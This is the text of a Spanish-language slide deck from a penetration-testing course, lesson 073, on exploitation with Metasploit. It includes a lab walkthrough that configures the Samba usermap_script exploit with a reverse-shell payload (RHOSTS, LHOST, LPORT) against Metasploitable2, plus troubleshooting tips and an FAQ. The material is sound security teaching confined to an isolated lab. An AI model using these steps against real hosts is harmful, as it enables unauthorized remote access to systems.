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073 — Metasploit: explotación y payloads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ejecutará el ciclo completo de explotación con Metasploit sobre un laboratorio propio: seleccionar un exploit acorde a una vulnerabilidad enumerada, elegir y configurar el payload adecuado (bind vs. reverse, staged vs. stageless), lanzar el ataque y gestionar la sesión resultante. Esta es la clase donde el reconocimiento se convierte en acceso real a un sistema, y por eso exige el máximo rigor ético y técnico.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Emparejar una vulnerabilidad enumerada previamente con un exploit compatible de Metasploit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Distinguir payloads bind y reverse, y staged y stageless, explicando cuándo conviene cada combinación.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Configurar correctamente LHOST, LPORT, RHOSTS y el target de un módulo antes de lanzarlo.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Ejecutar un exploit contra Metasploitable2/3 y gestionar la sesión resultante con sessions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Diagnosticar por qué un exploit falla (target incorrecto, firewall, payload incompatible) y corregirlo.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Justificar por escrito, para cada acción de explotación, que se realiza dentro de un alcance autorizado.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Emparejar exploit y vulnerabilidad</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  2 — Reverse shell vs. bind shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  3 — Payload staged vs. stageless</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  4 — check antes de exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  5 — Selección de target (set target)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  6 — Handlers y exploit -j</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  7 — Gestión de sesiones múltiples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Reverse shell: conexión donde la máquina víctima se conecta hacia el atacante. Característica clave: atraviesa firewalls que permiten tráfico saliente pero bloquean el entrante, el escenario más común en redes reales.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Bind shell: conexión donde el atacante se conecta a un puerto abierto por la víctima. Característica clave: falla si existe un firewall de entrada entre atacante y víctima.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Payload staged: payload identificado con / en su nombre (ej. windows/meterpreter/reversetcp) que envía primero un stager pequeño y luego descarga el resto. Característica clave: menor tamaño inicial, pero depende de más pasos de red.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Payload stageless: payload identificado con  (ej. windows/meterpreterreversetcp) que se envía completo en un solo bloque. Característica clave: más fiable en redes inestables o con filtrado agresivo, a costa de mayor tamaño.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Handler (exploit/multi/handler): módulo genérico que escucha la conexión que hará el payload una vez ejecutado en la víctima. Característica clave: debe configurarse con el mismo tipo de payload exacto que se generó o se usó en el exploit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  check: comando de Metasploit que verifica si el objetivo es vulnerable sin lanzar la explotación completa. Característica clave: no todos los módulos lo implementan, pero cuando existe reduce el riesgo de afectar el servicio.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Metasploit Framework y Metasploitable2/3 desplegadas en la misma red interna aislada (host-only) que en la clase anterior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Confirmar la IP de la máquina atacante (ip a en Kali) antes de configurar LHOST — un error aquí es la causa número uno de exploits fallidos.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Workspace de Metasploit ya poblado con hosts y servicios desde la clase 072 (dbnmap, hosts, services).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Objetivo 192.168.56.101 (Metasploitable2), atacante Kali 192.168.56.10 (ajustar según tu red de laboratorio).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Selecciona un exploit conocido y documentado de Metasploitable2, por ejemplo el de Samba: use exploit/multi/samba/usermapscript.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Fija el objetivo: set RHOSTS 192.168.56.101.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Lista los payloads compatibles con el exploit seleccionado: show payloads.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Elige un payload reverse y configúralo: set PAYLOAD cmd/unix/reverse, set LHOST 192.168.56.10, set LPORT 4444.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Revisa todas las opciones antes de disparar: options.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Si el módulo lo soporta, verifica sin explotar: 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ejemplo concreto en qué escenario un reverse shell es imprescindible frente a un bind shell.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Cambia un payload staged por su equivalente stageless en show payloads y describe la diferencia visible en el nombre y el tamaño.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Provoca un fallo de explotación poniendo un LHOST incorrecto y documenta el síntoma exacto observado en consola.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Usa check en un módulo que lo soporte y en uno que no lo soporte; documenta la diferencia de comportamiento.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Obtén dos sesiones simultáneas contra el mismo objetivo (usando dos exploits distintos) y practica moverte entre ellas con sessions -i.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Explica por qué el handler debe coincidir exactamente con el payload usado en el exploit, incluyendo arquitectura y formato.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Investiga y documenta, desde la perspectiva defensiva, qué patrón de tráfico de red generaría un IDS/IPS al detectar una conexión reverse shell hacia un puerto no estándar como el 4444.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Obtener una sesión interactiva en la VM de laboratorio mediante un exploit real de Metasploit y demostrar ejecución de comandos en el sistema comprometido.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Criterio de aceptación: sessions -l muestra al menos una sesión activa contra el objetivo de laboratorio; se ejecuta id (o equivalente) mostrando el usuario obtenido en la víctima; y se documenta por escrito el exploit usado, el payload configurado y las opciones exactas (RHOSTS, LHOST, LPORT). Todo el ejercicio se realiza contra una IP de laboratorio propio.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"Exploit completed, but no session was created" — Payload o target incorrecto, o firewall bloqueando la conexión de vuelta; probar otro payload o ajustar set target</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  El handler no recibe nunca la conexión — LHOST apunta a 127.0.0.1 en vez de la IP real de la interfaz de laboratorio; corregir con ip a</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  "The target is not exploitable" tras check — La versión del servicio no es vulnerable; verificar con services y elegir otro módulo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  La sesión se cae inmediatamente tras conectar — Payload staged inestable en la red de laboratorio; probar la variante stageless</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Puerto LPORT ya en uso — Otro handler o proceso ocupa el puerto; cambiar LPORT o finalizar el job anterior con jobs -K</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  El exploit tarda mucho o se queda colgado — Timeout de red o objetivo caído; verificar conectividad con ping/nmap antes de reintentar</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  set target con índice fuera de rango — El módulo tiene menos targets de los esperados; revisar show targets antes de fijar el índice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aparece "Exploit completed, but no session was created" tan seguido?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Suele deberse a incompatibilidad de payload/target, un firewall bloqueando la conexión de vuelta, o un LHOST mal configurado. Revisar options, probar un payload distinto y confirmar la IP de escucha resuelve la mayoría de los casos.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  ❓ ¿Debo elegir staged o stageless por defecto?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Depende de la calidad de la red. En redes de laboratorio estables, staged reduce el tamaño inicial transmitido. En redes con pérdida de paquetes o proxies intermedios, stageless suele ser más fiable porque no depende de descargar etapas adicionales.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  ❓ ¿Debo usar siempre reverse shells en vez de bind shells?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  En la mayoría de escenarios reales sí, porque los firewalls corporativos permiten tráfico saliente pero bloquean el entrante no solicitado. Los bind shells solo son viables cuando puedes alcanzar directamente el puerto que abre la víctima, algo cada vez menos común.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  ❓ ¿El comando check es siempre seguro de ejecutar?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Kennedy, D. et al. "Metasploit: The Penetration Tester's Guide" (No Starch Press) — capítulos sobre explotación y payloads.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Kim, P. "The Hacker Playbook 3" (2018) — metodología práctica de explotación en engagements reales.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Offensive Security, Metasploit Unleashed: &lt;https://www.offsec.com/metasploit-unleashed/&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Rapid7, documentación oficial de Metasploit sobre payloads: &lt;https://docs.metasploit.com/docs/using-metasploit/basics/payload-types-in-metasploit.html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  MITRE ATT&amp;CK, técnica T1210 (Exploitation of Remote Services): &lt;https://attack.mitre.org/techniques/T1210/&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  PTES (Penetration Testing Execution Standard), fase de Exploitation: &lt;http://www.pentest-standard.org&gt;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